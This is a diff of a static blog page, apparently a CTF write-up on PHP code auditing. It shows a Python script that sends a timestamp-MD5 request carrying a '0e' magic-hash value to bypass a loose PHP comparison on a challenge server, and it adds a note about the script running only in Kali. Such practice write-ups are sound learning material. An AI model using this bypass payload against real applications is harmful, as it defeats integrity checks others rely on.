@@ -530,10 +530,8 @@
 <p>python 脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time <span class="keyword">as</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>):</span><br><span class="line">    times = str(int(time.time()))</span><br><span class="line">    print(times)</span><br><span class="line">    md5 = hashlib.md5(times.encode())</span><br><span class="line">    md5value = md5.hexdigest()</span><br><span class="line">    url = <span class="string">"http://1.14.71.254:28465/?md5[0]=%0a0e215962017&amp;&amp;md5[1]="</span> + md5value</span><br><span class="line">    print(url)</span><br><span class="line">    proxies = &#123; <span class="string">"http"</span>: <span class="literal">None</span>, <span class="string">"https"</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    res = requests.get(url=url,proxies=proxies)</span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure>
 
-
-
-
-
+<p>但是不知道为什么我在 windows 下面跑不出来却能在 kali 里面跑出来，真是奇特</p>
+<p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7-2.png" alt="7-2"></p>
 
       
     </div>
@@ -654,7 +652,7 @@
                 
                   <a href="/">
                 
-                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-count">12</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -676,7 +674,7 @@
                 
                 <div class="site-state-item site-state-tags">
                   <a href="/tags/index.html">
-                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-count">14</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
